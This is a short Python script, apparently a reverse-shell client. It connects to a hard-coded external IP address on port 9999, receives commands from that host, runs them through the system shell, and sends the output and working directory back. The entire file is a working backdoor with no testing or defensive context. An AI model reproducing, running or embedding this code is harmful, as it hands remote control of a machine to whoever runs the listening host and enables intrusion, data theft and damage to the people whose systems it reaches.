import socket
import os
import subprocess

host = "134.141.244.70"
port = 9999
s = socket.socket()
s.connect((host, port))

while True:
    data = s.recv(1024)
    # To check whether the command is aimed ad changing directory
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))

    if len(data) > 0:
        # Executing the received command on the cmd
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        # Storing output_bytes in a variable
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        # Converting the bytes to string
        output_string = str(output_byte, 'utf-8')
        # To display the current directory as it is displayed in CMD
        current_WD = os.getcwd()+ ' > '
        s.send(str.encode(output_string + current_WD))
